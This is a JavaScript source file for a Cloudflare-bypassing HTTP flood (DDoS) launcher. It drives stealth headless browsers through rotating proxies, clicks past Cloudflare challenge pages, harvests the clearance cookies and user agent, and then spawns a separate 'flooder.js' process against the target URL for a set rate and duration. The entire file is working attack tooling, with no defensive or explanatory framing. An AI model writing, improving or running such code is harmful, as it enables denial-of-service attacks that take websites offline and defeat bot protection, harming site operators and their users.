const errorHandler = error => {
};
process.on("uncaughtException", errorHandler);
process.on("unhandledRejection", errorHandler);
Array.prototype.remove = function (item) {
  const index = this.indexOf(item);
  if (index !== -1) {
    this.splice(index, 1);
  }
  return item;
}
const COOKIES_MAX_RETRIES = 3;
const async = require("async");
const fs = require("fs");
const puppeteer = require("puppeteer-extra");
const puppeteerStealth = require("puppeteer-extra-plugin-stealth");
process.setMaxListeners(0);
require('events').EventEmitter.defaultMaxListeners = 0;
const stealthPlugin = puppeteerStealth();
puppeteer.use(stealthPlugin);

const targetURL = process.argv[2];
const threads = Number(process.argv[3]);
const proxiesCount = Number(process.argv[4]);
const proxyFile = process.argv[5];
const rates = Number(process.argv[6]);
const duration = Number(process.argv[7]);
function showUsageAndExit() {
    console.log(`Usage: Target Thread ProxyCount ProxyFile Rates Time`);
    process.exit(1);
}
if (!targetURL || isNaN(threads) || isNaN(proxiesCount) || !proxyFile || isNaN(rates) || isNaN(duration)) {
    showUsageAndExit();
}

const sleep = duration => new Promise(resolve => setTimeout(resolve, duration * 1000));
const { spawn } = require("child_process");
const readLines = path => fs.readFileSync(path).toString().split(/\r?\n/);
const randList = list => list[Math.floor(Math.random() * list.length)];
const proxies = readLines(proxyFile);
const colors = {
  COLOR_RED: "\x1b[31m",
  COLOR_GREEN: "\x1b[32m",
  COLOR_YELLOW: "\x1b[33m",
  COLOR_RESET: "\x1b[0m"
};
function colored(colorCode, text) {
  console.log(colorCode + text + colors.COLOR_RESET);
};
async function detectChallenge(browserProxy, page) {
  const title = await page.title();
  const content = await page.content();
  if (title === "Attention Required! | Cloudflare") {
    throw new Error("Proxy blocked");
  }
  if (content.includes("challenge-platform") === true) {
    colored(colors.COLOR_YELLOW, "HTTP-BROWSER | Found CloudFlare challenge " + browserProxy);
    try {
      await sleep(20);
      const captchaContainer = await page.$("iframe[src*='challenges']");
      await captchaContainer.click({
        offset: {
          x: 20,
          y: 20
        }
      });
    } finally {
      await sleep(10);
      return;
    }
  }
  colored(colors.COLOR_YELLOW, "HTTP-BROWSER | No challenge detected " + browserProxy);
  await sleep(30);
  return;
}
async function openBrowser(targetURL, browserProxy) {
  const promise = async (resolve, reject) => {
    const options = {
      headless: "new",
      ignoreHTTPSErrors: true,
      args: [
        "--proxy-server=http://" + browserProxy,
        "--no-sandbox",
        "--no-first-run",
        "--ignore-certificate-errors",
        "--disable-extensions",
        "--test-type",
        "--user-agent=Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
      ]
    };
    const browser = await puppeteer.launch(options);
    try {
      colored(colors.COLOR_YELLOW, "HTTP-BROWSER | Started browser " + browserProxy);
      const [page] = await browser.pages();
      const client = page._client();
      page.on("framenavigated", (frame) => {
        if (frame.url().includes("challenges.cloudflare.com") === true) client.send("Target.detachFromTarget", { targetId: frame._id });
      });
      page.setDefaultNavigationTimeout(60 * 1000);
      const userAgent = await page.evaluate(function () {
        return navigator.userAgent;
      });
      await page.goto(targetURL, {
        waitUntil: "domcontentloaded"
      });
      await detectChallenge(browserProxy, page, reject);
      const title = await page.title();
      const cookies = await page.cookies(targetURL);
      resolve({
        title: title,
        browserProxy: browserProxy,
        cookies: cookies.map(cookie => cookie.name + "=" + cookie.value).join("; ").trim(),
        userAgent: userAgent
      });
    } catch (exception) {
      reject("HTTP-BROWSER | Error when solving challenge " + browserProxy);
    } finally {
      colored(colors.COLOR_YELLOW, "HTTP-BROWSER | Closed browser " + browserProxy);
      await browser.close();
    }
  };
  return new Promise(promise);
}
async function startThread(targetURL, browserProxy, task, done, retries = 0) {
  if (retries === COOKIES_MAX_RETRIES) {
    const currentTask = queue.length();
    done(null, { task, currentTask });
  } else {
    try {
      const response = await openBrowser(targetURL, browserProxy);
      const cookies = "Title: " + response.title + " | " + response.browserProxy + " | " + response.userAgent + " | " + response.cookies;
      colored(colors.COLOR_GREEN, "HTTP-BROWSER | " + cookies);
      spawn("node", [
        "flooder.js",
        targetURL,
        duration,
        "6",
        response.browserProxy,
        rates,
        response.cookies,
        response.userAgent,
      ]);
      await startThread(targetURL, browserProxy, task, done, COOKIES_MAX_RETRIES);
    } catch (exception) {
      colored(colors.COLOR_RED, exception);
      await startThread(targetURL, browserProxy, task, done, COOKIES_MAX_RETRIES);
    }
  }
}
var queue = async.queue(function (task, done) {
  startThread(targetURL, task.browserProxy, task, done);
}, threads);
async function __main__() {
  for (let i = 0; i < proxiesCount; i++) {
    const browserProxy = randList(proxies);
    proxies.remove(browserProxy);
    queue.push({ browserProxy: browserProxy });
  }
  const queueDrainHandler = () => { };
  queue.drain(queueDrainHandler);
}
__main__();